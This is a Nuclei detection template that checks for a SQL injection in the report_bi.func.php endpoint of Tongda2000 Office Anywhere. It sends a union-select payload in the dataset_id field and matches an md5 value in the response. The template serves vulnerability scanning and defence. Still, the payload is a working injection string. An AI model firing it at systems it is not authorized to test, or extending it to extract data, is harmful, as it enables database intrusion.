id: tongda2000-office_anywhere-sql_injection
info:
  name: Tongda2000 Office Anywhere SQL Injection
  author: ProjectDiscoveryAI
  severity: high
  description: |
    This template identifies a SQL injection vulnerability in the Tongda2000 Office Anywhere application, specifically in the report_bi.func.php endpoint.

variables:
  f1: '{{rand_int(40000, 44800)}}'

http:
  - raw:
      - |
        POST /general/bi_design/appcenter/report_bi.func.php HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/x-www-form-urlencoded

        _POST[dataset_id]=efgh'-@`'`)union+select+1,2,md5({{f1}})#'&action=get_link_info
    stop-at-first-match: true
    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
      - type: regex
        part: body
        regex:
          - '{{md5(to_string(f1))}}'
